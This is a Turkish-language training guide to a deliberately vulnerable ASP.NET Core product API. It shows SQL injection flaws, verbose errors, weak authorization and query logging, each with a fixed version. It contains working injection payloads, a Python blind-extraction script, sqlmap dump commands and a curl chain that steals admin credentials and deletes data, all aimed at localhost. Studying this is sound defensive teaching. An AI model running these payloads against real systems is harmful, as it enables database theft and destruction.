# ?? ProductController Güvenlik Zafiyetleri Rehberi

## ?? UYARI
Bu döküman **EÐÝTÝM AMAÇLIDIR**. Burada anlatýlan SQL Injection teknikleri yalnýzca sahip olduðunuz veya test etme izniniz olan sistemlerde kullanýlmalýdýr.

---

## ?? Ýçindekiler
1. [SQL Injection - Keyword Search](#1-sql-injection---keyword-search)
2. [SQL Injection - Price Range](#2-sql-injection---price-range)
3. [SQL Injection - ID Parameter](#3-sql-injection---id-parameter)
4. [Detaylý Hata Mesajlarý](#4-detaylý-hata-mesajlarý)
5. [Zayýf Yetkilendirme](#5-zayýf-yetkilendirme)
6. [SQL Query Loglama](#6-sql-query-loglama)

---

## 1. SQL Injection - Keyword Search

### ?? Zafiyet Kodu

```csharp
[HttpGet("search")]
public async Task<IActionResult> SearchProducts([FromQuery] string keyword)
{
    // ? ZAFIYET: String concatenation ile SQL sorgusu
    var query = $"SELECT \"Id\", \"Name\", \"Description\", \"Price\", \"Stock\", \"Category\", \"CreatedAt\" FROM \"Products\" WHERE \"Name\" LIKE '%{keyword}%' OR \"Description\" LIKE '%{keyword}%'";
    
    // ? SQL sorgusu loglanýyor
    Console.WriteLine($"SQL Query: {query}");
    
    var products = await _context.Products
        .FromSqlRaw(query)  // ? Parameterized query deðil!
        .ToListAsync();
 
    return Ok(products);
}
```

### ?? Saldýrý Senaryosu 1: Tüm Ürünleri Göster

**Payload:**
```sql
' OR '1'='1
```

**URL:**
```
GET /api/product/search?keyword=' OR '1'='1
```

**Oluþan SQL:**
```sql
SELECT "Id", "Name", "Description", "Price", "Stock", "Category", "CreatedAt" 
FROM "Products" 
WHERE "Name" LIKE '%' OR '1'='1%' OR "Description" LIKE '%' OR '1'='1%'
```

**Sonuç:** ? Tüm ürünler döndü!

---

### ?? Saldýrý Senaryosu 2: Kullanýcý Þifrelerini Çal (UNION-Based SQL Injection)

**Hedef:** Users tablosundan þifreleri çekmek

#### Adým 1: Kolon Sayýsýný Bul

Products tablosu **7 kolona** sahip:
```
Id, Name, Description, Price, Stock, Category, CreatedAt
```

Users tablosundan da **7 kolon** seçmeliyiz!

#### Adým 2: UNION Payload Hazýrla

**Payload:**
```sql
' UNION SELECT "Id", "Username", "Password", "Email", 0, "PhoneNumber", "CreatedAt" FROM "Users"--
```

**URL (Encoded):**
```
GET /api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%20%22Username%22,%20%22Password%22,%20%22Email%22,%200,%20%22PhoneNumber%22,%20%22CreatedAt%22%20FROM%20%22Users%22--
```

**Oluþan SQL:**
```sql
SELECT "Id", "Name", "Description", "Price", "Stock", "Category", "CreatedAt" 
FROM "Products" 
WHERE "Name" LIKE '%' 
UNION SELECT "Id", "Username", "Password", "Email", 0, "PhoneNumber", "CreatedAt" FROM "Users"--%' 
OR "Description" LIKE '%' UNION SELECT ...
```

**Sonuç:**
```json
[
  {
 "id": 1,
 "name": "Laptop",
 "description": "High-performance laptop",
 "price": 1299.99,
    "stock": 50,
    "category": "Electronics",
    "createdAt": "2026-02-15T16:55:13.923Z"
  },
  {
    "id": 1,
    "name": "admin",
    "description": "admin123",     // ?? Þifre!
    "price": "admin@vulnerable.api",
    "stock": 0,
 "category": "555-0001",
    "createdAt": "2026-02-15T16:55:13.923Z"
  },
  {
    "id": 2,
    "name": "john",
    "description": "12345", // ?? Þifre!
    "price": "john@vulnerable.api",
    "stock": 0,
    "category": "555-0002",
    "createdAt": "2026-02-15T16:55:13.923Z"
  }
]
```

?? **Baþarýlý!** Tüm kullanýcý þifrelerini çaldýk!

---

### ?? Saldýrý Senaryosu 3: Kredi Kartý Bilgilerini Çal

**Payload:**
```sql
' UNION SELECT "Id", "Username", "CreditCardNumber", "FullName", 0, "Address", "CreatedAt" FROM "Users"--
```

**URL (Encoded):**
```
GET /api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%20%22Username%22,%20%22CreditCardNumber%22,%20%22FullName%22,%200,%20%22Address%22,%20%22CreatedAt%22%20FROM%20%22Users%22--
```

**Sonuç:**
```json
[
  {
    "id": 1,
    "name": "admin",
    "description": "4532-1234-5678-9010",  // ?? Kredi Kartý!
    "price": "System Administrator",
    "stock": 0,
    "category": "123 Admin Street",
    "createdAt": "2026-02-15T16:55:13.923Z"
  }
]
```

---

### ?? Saldýrý Senaryosu 4: Blind SQL Injection (Time-Based)

**Amaç:** Veritabaný yapýsýný keþfetmek

**Payload (PostgreSQL):**
```sql
'; SELECT CASE WHEN (SELECT COUNT(*) FROM "Users" WHERE "Username"='admin') > 0 THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Test:**
```bash
# Admin kullanýcýsý var mý?
time curl "http://localhost:5000/api/product/search?keyword=%27;%20SELECT%20CASE%20WHEN%20(SELECT%20COUNT(*)%20FROM%20%22Users%22%20WHERE%20%22Username%22=%27admin%27)%20%3E%200%20THEN%20pg_sleep(5)%20ELSE%20pg_sleep(0)%20END--"

# Eðer 5+ saniye sürerse ? Admin kullanýcýsý var!
```

---

### ??? Güvenli Versiyon

```csharp
[HttpGet("search")]
public async Task<IActionResult> SearchProducts([FromQuery] string keyword)
{
    if (string.IsNullOrWhiteSpace(keyword))
   return BadRequest(new { message = "Keyword is required" });
    
    // ? Input validation
    if (keyword.Length > 100)
   return BadRequest(new { message = "Keyword too long" });
    
    // ? Parameterized query with LINQ
    var products = await _context.Products
        .Where(p => EF.Functions.Like(p.Name, $"%{keyword}%") || 
      EF.Functions.Like(p.Description, $"%{keyword}%"))
 .ToListAsync();
    
    return Ok(products);
}

// Veya FromSqlRaw kullanarak:
[HttpGet("search-safe")]
public async Task<IActionResult> SearchProductsSafe([FromQuery] string keyword)
{
    // ? Parameterized query
    var products = await _context.Products
        .FromSqlRaw(
         "SELECT * FROM \"Products\" WHERE \"Name\" LIKE {0} OR \"Description\" LIKE {0}",
            $"%{keyword}%"
  )
   .ToListAsync();
    
    return Ok(products);
}
```

### ?? OWASP API Security Top 10
- **API8:2023** - Security Misconfiguration
- **A03:2021** - Injection (OWASP Top 10)

---

## 2. SQL Injection - Price Range

### ?? Zafiyet Kodu

```csharp
[HttpGet("search-by-price")]
public async Task<IActionResult> SearchByPrice([FromQuery] string minPrice, [FromQuery] string maxPrice)
{
    // ? ZAFIYET: Numeric parametrelerde validation yok
    // ? String concatenation kullanýlýyor
    var query = $"SELECT * FROM \"Products\" WHERE \"Price\" BETWEEN {minPrice} AND {maxPrice}";
    
    var products = await _context.Products
  .FromSqlRaw(query)
        .ToListAsync();
    
    return Ok(products);
}
```

### ?? Saldýrý Senaryosu 1: Tüm Ürünleri Göster

**Payload:**
```
minPrice: 0 OR 1=1--
maxPrice: 9999
```

**URL:**
```
GET /api/product/search-by-price?minPrice=0 OR 1=1--&maxPrice=9999
```

**Oluþan SQL:**
```sql
SELECT * FROM "Products" WHERE "Price" BETWEEN 0 OR 1=1-- AND 9999
```

**Sonuç:** ? Tüm ürünler döndü!

---

### ?? Saldýrý Senaryosu 2: UNION-Based Injection

**Payload:**
```
minPrice: 0 UNION SELECT "Id", "Username", "Password", "Email", 0, "PhoneNumber", "CreatedAt" FROM "Users"--
maxPrice: 9999
```

**URL (Encoded):**
```
GET /api/product/search-by-price?minPrice=0%20UNION%20SELECT%20%22Id%22,%20%22Username%22,%20%22Password%22,%20%22Email%22,%200,%20%22PhoneNumber%22,%20%22CreatedAt%22%20FROM%20%22Users%22--&maxPrice=9999
```

**Oluþan SQL:**
```sql
SELECT * FROM "Products" 
WHERE "Price" BETWEEN 0 UNION SELECT "Id", "Username", "Password", "Email", 0, "PhoneNumber", "CreatedAt" FROM "Users"-- AND 9999
```

**Sonuç:** ?? Kullanýcý bilgileri çekildi!

---

### ?? Saldýrý Senaryosu 3: Boolean-Based Blind SQL Injection

**Amaç:** Admin þifresinin ilk harfini bul

**Payload:**
```
minPrice: 0 AND (SELECT SUBSTRING("Password", 1, 1) FROM "Users" WHERE "Username"='admin') = 'a'--
maxPrice: 9999
```

**Test Script (Python):**
```python
import requests
import string

url = "http://localhost:5000/api/product/search-by-price"
charset = string.ascii_lowercase + string.digits

password = ""
for position in range(1, 20):
    for char in charset:
        params = {
     "minPrice": f"0 AND (SELECT SUBSTRING(\"Password\", {position}, 1) FROM \"Users\" WHERE \"Username\"='admin') = '{char}'--",
  "maxPrice": "9999"
   }
        response = requests.get(url, params=params)
        
  if response.status_code == 200 and len(response.json()) > 0:
            password += char
            print(f"[+] Found: {password}")
   break

print(f"[!] Admin password: {password}")
```

---

### ??? Güvenli Versiyon

```csharp
[HttpGet("search-by-price")]
public async Task<IActionResult> SearchByPrice([FromQuery] decimal? minPrice, [FromQuery] decimal? maxPrice)
{
    // ? Strongly typed parameters (decimal instead of string)
    if (!minPrice.HasValue || !maxPrice.HasValue)
        return BadRequest(new { message = "Both minPrice and maxPrice are required" });
    
    // ? Input validation
    if (minPrice < 0 || maxPrice < 0)
        return BadRequest(new { message = "Prices must be positive" });
    
    if (minPrice > maxPrice)
return BadRequest(new { message = "minPrice cannot be greater than maxPrice" });
    
    // ? LINQ query (EF Core handles parameterization)
 var products = await _context.Products
        .Where(p => p.Price >= minPrice && p.Price <= maxPrice)
        .ToListAsync();
    
    return Ok(products);
}
```

### ?? OWASP API Security Top 10
- **API8:2023** - Security Misconfiguration
- **A03:2021** - Injection

---

## 3. SQL Injection - ID Parameter

### ?? Zafiyet Kodu

```csharp
[HttpGet("{id}")]
public async Task<IActionResult> GetProductById(string id)
{
    // ? ZAFIYET: ID parametresi string olarak kabul ediliyor
    // ? Direkt SQL'e ekleniyor
    var query = $"SELECT * FROM \"Products\" WHERE \"Id\" = {id}";
    
    var product = await _context.Products
        .FromSqlRaw(query)
  .FirstOrDefaultAsync();
 
 return Ok(product);
}
```

### ?? Saldýrý Senaryosu 1: Tüm Ürünleri Göster

**Payload:**
```
id: 1 OR 1=1--
```

**URL:**
```
GET /api/product/1 OR 1=1--
```

**Oluþan SQL:**
```sql
SELECT * FROM "Products" WHERE "Id" = 1 OR 1=1--
```

**Sonuç:** ? Ýlk ürün döndü (veya tüm ürünler)

---

### ?? Saldýrý Senaryosu 2: UNION-Based Injection

**Payload:**
```
id: -1 UNION SELECT "Id", "Username", "Password", "Email", 0, "PhoneNumber", "CreatedAt" FROM "Users" WHERE "Id"=1--
```

**URL (Encoded):**
```
GET /api/product/-1%20UNION%20SELECT%20%22Id%22,%20%22Username%22,%20%22Password%22,%20%22Email%22,%200,%20%22PhoneNumber%22,%20%22CreatedAt%22%20FROM%20%22Users%22%20WHERE%20%22Id%22=1--
```

**Oluþan SQL:**
```sql
SELECT * FROM "Products" WHERE "Id" = -1 
UNION SELECT "Id", "Username", "Password", "Email", 0, "PhoneNumber", "CreatedAt" 
FROM "Users" WHERE "Id"=1--
```

**Sonuç:**
```json
{
  "id": 1,
  "name": "admin",
  "description": "admin123",  // ?? Þifre!
  "price": "admin@vulnerable.api",
  "stock": 0,
  "category": "555-0001",
  "createdAt": "2026-02-15T16:55:13.923Z"
}
```

---

### ?? Saldýrý Senaryosu 3: Error-Based SQL Injection

**Payload:**
```
id: 1' AND 1=CAST((SELECT "Username" FROM "Users" LIMIT 1) AS INTEGER)--
```

**URL:**
```
GET /api/product/1' AND 1=CAST((SELECT "Username" FROM "Users" LIMIT 1) AS INTEGER)--
```

**Beklenen Hata:**
```json
{
  "message": "Database error",
  "error": "22P02: invalid input syntax for type integer: \"admin\"",
  "stackTrace": "..."
}
```

?? **Baþarýlý!** Hata mesajýndan username öðrendik: **admin**

---

### ??? Güvenli Versiyon

```csharp
[HttpGet("{id:int}")]  // ? Route constraint: sadece integer
public async Task<IActionResult> GetProductById(int id)
{
    // ? Strongly typed parameter
    if (id <= 0)
        return BadRequest(new { message = "Invalid product ID" });
    
    // ? EF Core parameterized query
    var product = await _context.Products.FindAsync(id);
    
    if (product == null)
   return NotFound(new { message = "Product not found" });
    
return Ok(product);
}

// Veya LINQ kullanarak:
[HttpGet("{id:int}")]
public async Task<IActionResult> GetProductByIdLinq(int id)
{
    var product = await _context.Products
  .Where(p => p.Id == id)  // ? LINQ otomatik parameterize eder
        .FirstOrDefaultAsync();
    
    if (product == null)
        return NotFound();
    
    return Ok(product);
}
```

### ?? OWASP API Security Top 10
- **API8:2023** - Security Misconfiguration
- **A03:2021** - Injection

---

## 4. Detaylý Hata Mesajlarý

### ?? Zafiyet Kodu

```csharp
catch (Exception ex)
{
    // ? ZAFIYET: Tüm exception detaylarýný döndürüyor
    _logger.LogError(ex, "SQL query failed");
  return StatusCode(500, new { 
        message = "Database error occurred", 
 error = ex.Message,             // ? Hata mesajý
        stackTrace = ex.StackTrace,  // ? Stack trace
        query = query    // ? SQL sorgusu!
    });
}
```

### ?? Saldýrý Senaryosu: Information Disclosure

**Hatalý SQL Injection Payloadý Gönder:**
```
GET /api/product/search?keyword=' UNION SELECT 1,2,3,4,5,6,7--
```

**Yanýt:**
```json
{
  "message": "Database error occurred",
  "error": "42601: each UNION query must have the same number of columns\r\n\r\nPOSITION: 61",
  "stackTrace": "   at Npgsql.Internal.NpgsqlConnector...\n   at Microsoft.EntityFrameworkCore.Query...",
  "query": "SELECT \"Id\", \"Name\", \"Description\", \"Price\", \"Stock\", \"Category\", \"CreatedAt\" FROM \"Products\" WHERE \"Name\" LIKE '%' UNION SELECT 1,2,3,4,5,6,7--%' OR \"Description\" LIKE '%' UNION SELECT 1,2,3,4,5,6,7--%'"
}
```

**Saldýrganýn Öðrendikleri:**
1. ? PostgreSQL kullanýlýyor
2. ? Products tablosu **7 kolona** sahip
3. ? Kolon isimleri: `Id, Name, Description, Price, Stock, Category, CreatedAt`
4. ? SQL injection çalýþýyor
5. ? Entity Framework Core kullanýlýyor

---

### ??? Güvenli Versiyon

```csharp
catch (Exception ex)
{
    // ? Detaylý hata sadece sunucu loglarýna
    _logger.LogError(ex, "Product search failed for keyword: {Keyword}", keyword);
    
    // ? Kullanýcýya generic hata mesajý
  return StatusCode(500, new { 
        message = "An error occurred while processing your request",
        requestId = Guid.NewGuid()  // Support için referans ID
    });
}

// Program.cs'de:
if (app.Environment.IsDevelopment())
{
    app.UseDeveloperExceptionPage();  // ? Sadece development'ta
}
else
{
 app.UseExceptionHandler("/error");  // ? Production'da generic handler
}
```

### ?? OWASP API Security Top 10
- **API8:2023** - Security Misconfiguration
- **A09:2021** - Security Logging and Monitoring Failures

---

## 5. Zayýf Yetkilendirme

### ?? Zafiyet Kodu

```csharp
[HttpPost]
[Authorize]  // ? Authentication var
public async Task<IActionResult> CreateProduct([FromBody] Product product)
{
    // ? ZAFIYET: Admin kontrolü YOK!
    // Herhangi bir authenticated kullanýcý ürün oluþturabilir
    _context.Products.Add(product);
    await _context.SaveChangesAsync();
    
    return CreatedAtAction(nameof(GetProductById), new { id = product.Id }, product);
}
```

### ?? Saldýrý Senaryosu

**Adým 1: Normal kullanýcý olarak login ol**
```bash
POST /api/auth/login
{
  "username": "john",
  "password": "12345"
}
```

**Adým 2: Ürün oluþtur**
```bash
POST /api/product
Authorization: Bearer {john_token}
Content-Type: application/json

{
  "name": "Fake Product",
  "description": "This product shouldn't exist!",
  "price": 9999.99,
  "stock": 1000,
  "category": "Hacked"
}
```

**Sonuç:** ? Ürün baþarýyla oluþturuldu!

?? **Normal kullanýcý admin iþlemi yaptý!**

---

### ??? Güvenli Versiyon

```csharp
[HttpPost]
[Authorize(Roles = "Admin")]  // ? Sadece Admin rolü
public async Task<IActionResult> CreateProduct([FromBody] Product product)
{
    // ? Double-check role
    if (!User.IsInRole("Admin"))
    {
        _logger.LogWarning("Unauthorized product creation attempt by {User}", 
 User.FindFirst(ClaimTypes.Name)?.Value);
        return Forbid();
    }
    
// ? Input validation
    if (product.Price <= 0)
        return BadRequest(new { message = "Price must be positive" });
    
    if (product.Stock < 0)
        return BadRequest(new { message = "Stock cannot be negative" });
    
    _context.Products.Add(product);
    await _context.SaveChangesAsync();
  
    return CreatedAtAction(nameof(GetProductById), new { id = product.Id }, product);
}
```

### ?? OWASP API Security Top 10
- **API1:2023** - Broken Object Level Authorization
- **API5:2023** - Broken Function Level Authorization

---

## 6. SQL Query Loglama

### ?? Zafiyet Kodu

```csharp
[HttpGet("search")]
public async Task<IActionResult> SearchProducts([FromQuery] string keyword)
{
    var query = $"SELECT ... WHERE \"Name\" LIKE '%{keyword}%' ...";
  
    // ? ZAFIYET: SQL sorgusu console ve log'a yazýlýyor
    _logger.LogInformation("Executing SQL query: {Query}", query);
    Console.WriteLine($"SQL Query: {query}");
    
    // ...
}
```

### ?? Saldýrý Senaryosu

**Saldýrgan SQL Injection Yapýyor:**
```
GET /api/product/search?keyword=' UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--
```

**Console/Log Çýktýsý:**
```
[2024-02-15 10:30:15] INFO: Executing SQL query: SELECT "Id", "Name", "Description", "Price", "Stock", "Category", "CreatedAt" FROM "Products" WHERE "Name" LIKE '%' UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--%' OR "Description" LIKE '%' UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--%'
```

**Sorun:**
1. ? SQL Injection payloadý log'a yazýldý
2. ? Log dosyalarýna eriþen herkes saldýrý vektörlerini görebilir
3. ? Baþarýlý payload'larý kopyalayýp kullanabilir
4. ? Sistemin savunmasýz olduðunu öðrenir

---

### ??? Güvenli Versiyon

```csharp
[HttpGet("search")]
public async Task<IActionResult> SearchProducts([FromQuery] string keyword)
{
    // ? Sadece parametre uzunluðunu logla
    _logger.LogInformation("Product search requested with keyword length: {Length}", 
        keyword?.Length ?? 0);
    
    // ? Suspicious input detection
    if (keyword.Contains("UNION", StringComparison.OrdinalIgnoreCase) ||
      keyword.Contains("SELECT", StringComparison.OrdinalIgnoreCase) ||
        keyword.Contains("--") ||
        keyword.Contains(";"))
    {
      _logger.LogWarning("Suspicious product search attempt from IP: {IP}", 
        HttpContext.Connection.RemoteIpAddress);
 return BadRequest(new { message = "Invalid search keyword" });
    }
  
    // ? Parameterized query (güvenli)
    var products = await _context.Products
        .Where(p => EF.Functions.Like(p.Name, $"%{keyword}%"))
        .ToListAsync();
    
    return Ok(products);
}
```

### ?? OWASP API Security Top 10
- **API8:2023** - Security Misconfiguration
- **A09:2021** - Security Logging and Monitoring Failures

---

## ?? Tüm Zafiyetlerin Özeti

| # | Zafiyet | Endpoint | Tehlike | OWASP |
|---|---------|----------|---------|-------|
| 1 | SQL Injection (Keyword) | `GET /search` | ?? Kritik | API8:2023 |
| 2 | SQL Injection (Price) | `GET /search-by-price` | ?? Kritik | API8:2023 |
| 3 | SQL Injection (ID) | `GET /{id}` | ?? Kritik | API8:2023 |
| 4 | Detaylý Hata Mesajlarý | Tüm endpoint'ler | ?? Yüksek | API8:2023 |
| 5 | Zayýf Yetkilendirme | `POST /` | ?? Orta | API5:2023 |
| 6 | Query Loglama | `GET /search` | ?? Orta | API8:2023 |

---

## ??? SQL Injection Araçlarý

### 1. SQLMap (Otomatik SQL Injection)

```bash
# Keyword endpoint test
sqlmap -u "http://localhost:5000/api/product/search?keyword=test" \
  --batch --dbs

# Kullanýcý bilgilerini çek
sqlmap -u "http://localhost:5000/api/product/search?keyword=test" \
  --batch -D vulnerabledb -T Users --dump

# Price range endpoint
sqlmap -u "http://localhost:5000/api/product/search-by-price?minPrice=0&maxPrice=9999" \
  --batch --dbs
```

### 2. Manuel Test Script (Python)

```python
import requests

base_url = "http://localhost:5000/api/product/search"

# Test payloads
payloads = [
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3,4,5,6,7--",
    "' UNION SELECT \"Id\",\"Username\",\"Password\",\"Email\",0,\"PhoneNumber\",\"CreatedAt\" FROM \"Users\"--"
]

for payload in payloads:
try:
        response = requests.get(base_url, params={"keyword": payload})
 print(f"\n[+] Payload: {payload}")
        print(f"[+] Status: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
      print(f"[+] Results: {len(data)} items")
            
    # Kullanýcý bilgisi var mý kontrol et
      for item in data:
  if 'username' in str(item).lower():
          print(f"[!] POTENTIAL USER DATA LEAK: {item}")
    except Exception as e:
        print(f"[-] Error: {e}")
```

### 3. Burp Suite Intruder

**Positions:**
```
GET /api/product/search?keyword=§PAYLOAD§ HTTP/1.1
Host: localhost:5000
```

**Payloads:**
```
' OR '1'='1
' OR '1'='1'--
' UNION SELECT NULL--
' UNION SELECT 1,2,3,4,5,6,7--
' UNION SELECT "Id","Username","Password","Email",0,"PhoneNumber","CreatedAt" FROM "Users"--
```

---

## ?? Pratik Yapma Senaryolarý

### Senaryo 1: Temel SQL Injection (5 dakika)

```bash
# 1. Tüm ürünleri göster
curl "http://localhost:5000/api/product/search?keyword=%27%20OR%20%271%27=%271"

# 2. UNION injection test
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%201,2,3,4,5,6,7--"

# 3. Kullanýcý bilgilerini çek
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22--"
```

### Senaryo 2: Farklý Endpoint'lerde SQL Injection (10 dakika)

```bash
# Price range injection
curl "http://localhost:5000/api/product/search-by-price?minPrice=0%20OR%201=1--&maxPrice=9999"

# ID injection
curl "http://localhost:5000/api/product/1%20OR%201=1--"

# Kredi kartý bilgilerini çek
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%22Username%22,%22CreditCardNumber%22,%22FullName%22,0,%22Address%22,%22CreatedAt%22%20FROM%20%22Users%22--"
```

### Senaryo 3: Zayýf Yetkilendirme (5 dakika)

```bash
# Normal kullanýcý olarak login
TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"12345"}' \
  | jq -r '.token')

# Ürün oluþtur (admin olmamasýna raðmen)
curl -X POST http://localhost:5000/api/product \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked Product","description":"Unauthorized","price":99.99,"stock":100,"category":"Exploit"}'
```

### Senaryo 4: SQL Injection + Token Manipulation (15 dakika)

```bash
# 1. SQL Injection ile admin þifresini bul
curl "http://localhost:5000/api/product/search?keyword=%27%20UNION%20SELECT%20%22Id%22,%22Username%22,%22Password%22,%22Email%22,0,%22PhoneNumber%22,%22CreatedAt%22%20FROM%20%22Users%22%20WHERE%20%22Username%22=%27admin%27--"

# 2. Admin olarak login ol
ADMIN_TOKEN=$(curl -s -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' \
  | jq -r '.token')

# 3. Tüm ürünleri sil
curl -X DELETE http://localhost:5000/api/product/1 \
  -H "Authorization: Bearer $ADMIN_TOKEN"

curl -X DELETE http://localhost:5000/api/product/2 \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

---

## ?? Güvenli Kod Örnekleri

### Tam Güvenli ProductController

```csharp
[ApiController]
[Route("api/[controller]")]
public class SecureProductController : ControllerBase
{
    private readonly VulnerableDbContext _context;
    private readonly ILogger<SecureProductController> _logger;

    public SecureProductController(VulnerableDbContext context, ILogger<SecureProductController> logger)
    {
        _context = context;
        _logger = logger;
}

    /// <summary>
    /// Güvenli ürün arama - Parameterized query
    /// </summary>
    [HttpGet("search")]
    public async Task<IActionResult> SearchProducts([FromQuery] string keyword)
    {
        // ? Input validation
    if (string.IsNullOrWhiteSpace(keyword))
            return BadRequest(new { message = "Keyword is required" });
        
        if (keyword.Length > 100)
            return BadRequest(new { message = "Keyword too long" });
        
     // ? SQL Injection detection
        if (ContainsSqlInjectionPatterns(keyword))
{
    _logger.LogWarning("Suspicious search attempt from {IP} with keyword length {Length}", 
     HttpContext.Connection.RemoteIpAddress, keyword.Length);
     return BadRequest(new { message = "Invalid search keyword" });
        }
        
      try
        {
       // ? LINQ query (otomatik parameterization)
   var products = await _context.Products
      .Where(p => EF.Functions.Like(p.Name, $"%{keyword}%") || 
                EF.Functions.Like(p.Description, $"%{keyword}%"))
                .Take(50)  // ? Limit results
     .ToListAsync();
      
       _logger.LogInformation("Product search completed, found {Count} products", products.Count);
          
            return Ok(products);
        }
        catch (Exception ex)
        {
     // ? Generic error message
            _logger.LogError(ex, "Error during product search");
 return StatusCode(500, new { 
                message = "An error occurred",
    requestId = Guid.NewGuid()
         });
     }
    }

 /// <summary>
    /// Güvenli fiyat aralýðý arama
    /// </summary>
    [HttpGet("search-by-price")]
    public async Task<IActionResult> SearchByPrice(
        [FromQuery] decimal? minPrice, 
        [FromQuery] decimal? maxPrice)
    {
      // ? Type-safe parameters
        if (!minPrice.HasValue || !maxPrice.HasValue)
       return BadRequest(new { message = "Both prices are required" });
        
   // ? Validation
        if (minPrice < 0 || maxPrice < 0)
    return BadRequest(new { message = "Prices must be positive" });
        
        if (minPrice > maxPrice)
 return BadRequest(new { message = "Invalid price range" });
        
        var products = await _context.Products
            .Where(p => p.Price >= minPrice && p.Price <= maxPrice)
            .ToListAsync();
        
        return Ok(products);
    }

    /// <summary>
    /// Güvenli ID ile ürün getirme
    /// </summary>
    [HttpGet("{id:int}")]  // ? Route constraint
    public async Task<IActionResult> GetProductById(int id)
    {
        if (id <= 0)
       return BadRequest(new { message = "Invalid product ID" });
        
        var product = await _context.Products.FindAsync(id);
        
        if (product == null)
            return NotFound();
        
     return Ok(product);
    }

    /// <summary>
    /// Güvenli ürün oluþturma - Admin only
    /// </summary>
    [HttpPost]
    [Authorize(Roles = "Admin")]
    public async Task<IActionResult> CreateProduct([FromBody] Product product)
    {
        // ? Input validation
        if (string.IsNullOrWhiteSpace(product.Name))
         return BadRequest(new { message = "Product name is required" });
        
      if (product.Price <= 0)
     return BadRequest(new { message = "Price must be positive" });
        
  if (product.Stock < 0)
            return BadRequest(new { message = "Stock cannot be negative" });
        
        _context.Products.Add(product);
  await _context.SaveChangesAsync();
   
        return CreatedAtAction(nameof(GetProductById), new { id = product.Id }, product);
    }

    private bool ContainsSqlInjectionPatterns(string input)
    {
 var patterns = new[] { 
            "UNION", "SELECT", "INSERT", "UPDATE", "DELETE", "DROP", 
            "--", ";", "/*", "*/", "xp_", "sp_", "EXEC", "EXECUTE"
        };
        
        return patterns.Any(pattern => 
            input.Contains(pattern, StringComparison.OrdinalIgnoreCase));
    }
}
```

---

## ?? Öðrenme Kaynaklarý

### SQL Injection Eðitimi
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)

### PostgreSQL Security
- [PostgreSQL Security Best Practices](https://www.postgresql.org/docs/current/sql-syntax.html)
- [Npgsql EF Core Documentation](https://www.npgsql.org/efcore/)

### Güvenli Kodlama
- [Microsoft EF Core Security](https://docs.microsoft.com/en-us/ef/core/querying/raw-sql)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

---

## ?? Son Uyarý

Bu döküman **sadece eðitim amaçlýdýr**. 

### ? Asla Yapma
- Baþkasýnýn sisteminde SQL Injection test etme
- Ýzin almadan güvenlik testi yapma
- Production veritabanýnda test etme
- Öðrendiklerini kötüye kullanma

### ? Her Zaman Yap
- Kendi test ortamýnda çalýþ
- Parameterized query kullan
- Input validation yap
- Güvenlik best practice'lerini uygula

---

**Hazýrlayan:** Security Education Team  
**Versiyon:** 1.0  
**Amaç:** Eðitim

?? **Güvenli kodlama!**
